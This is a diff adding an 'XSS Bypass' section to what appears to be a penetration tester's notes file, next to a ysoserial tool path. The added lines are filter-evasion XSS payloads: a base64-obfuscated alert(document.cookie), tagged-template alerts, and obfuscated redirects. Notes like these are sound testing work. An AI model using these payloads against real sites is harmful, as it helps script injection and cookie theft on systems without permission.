@@ -26,7 +26,28 @@ ysoserial path
 D:\Tools\tools\ysoserial\ysoserial-all.jar
 ```
 
+XSS Bypass
 
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads
+
+```
+eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))   <--  [echo -n "alert(document.cookie)" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ==]
+alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+window['alert'](document['domain'])
+window["doc"+"ument"]
+
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+
+
+
+
+
+```
 
 
 
